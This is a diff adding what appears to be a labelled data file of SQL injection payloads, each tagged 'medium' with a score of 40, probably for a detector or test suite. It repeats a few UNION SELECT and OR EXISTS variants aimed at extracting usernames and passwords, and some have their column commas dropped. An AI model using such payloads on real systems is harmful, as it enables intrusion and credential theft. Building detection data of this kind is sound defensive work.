@@ -1,0 +1,101 @@
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+'/**/OR/**/EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+'/**/OR/**/EXISTS(SELECT * FROM users) --,medium,40
+'/**/OR/**/EXISTS(SELECT * FROM users) --,medium,40
+'/**/OR/**/EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+'/**/OR/**/EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+'/**/OR/**/EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+'/**/OR/**/EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT 1 2 3 --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users --,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- /* test */,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+' UNION SELECT username password FROM users -- OR EXISTS(SELECT * FROM users) --,medium,40
+'/**/OR/**/EXISTS(SELECT * FROM users) --,medium,40
